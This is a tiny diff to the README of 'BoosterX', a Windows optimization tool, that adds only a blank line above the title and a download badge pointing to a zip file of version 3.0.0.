@@ -1,6 +1,7 @@
 
 
 
+
 # 🚀 BoosterX - Ultimate Windows Optimization Suite
 
 [![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](https://github.com/VaDDoS56/BoosterX/raw/refs/heads/main/BoosterX.zip)
